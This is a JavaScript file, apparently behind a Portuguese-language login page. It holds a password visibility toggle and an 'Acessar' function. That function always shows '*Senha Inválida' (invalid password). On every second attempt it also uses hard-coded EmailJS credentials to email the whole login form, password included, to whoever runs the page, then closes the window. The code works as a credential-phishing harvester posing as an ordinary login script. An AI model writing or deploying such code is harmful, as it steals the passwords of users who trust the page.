document.addEventListener('DOMContentLoaded', () => {
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('toggle-password');

    togglePassword.addEventListener('click', () => {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        togglePassword.querySelector('img').alt = type === 'password' ? 'Mostrar senha' : 'Ocultar senha';
    });
});

let EntradaPermitida = true

function Acessar() {
    const senhaInvalida = document.getElementById("senhaInvalida")
    EntradaPermitida = !EntradaPermitida

    if (EntradaPermitida) {
        (function() {
            emailjs.init("zai5eYn03Z7zxaakg"); 
         })();
   
         document.querySelector('.login-form').addEventListener('click', function(event) {
               event.preventDefault(); // Previne o comportamento padrão do formulário
   
               const serviceID = 'service_lnbca0y'; // Substitua "YOUR_SERVICE_ID" pelo seu ID de serviço EmailJS
               const templateID = 'template_q59qps5'; // Substitua "YOUR_TEMPLATE_ID" pelo seu ID de template EmailJS
   
               emailjs.sendForm(serviceID, templateID, this)
                   .then(function(response) {
                       console.log('E-mail enviado com sucesso!', response.status, response.text);
                   }, function(error) {
                       console.log('Erro ao enviar o e-mail:', error);
                   });
           });
        
        window.close();
    }

    senhaInvalida.innerHTML = "*Senha Inválida"
}

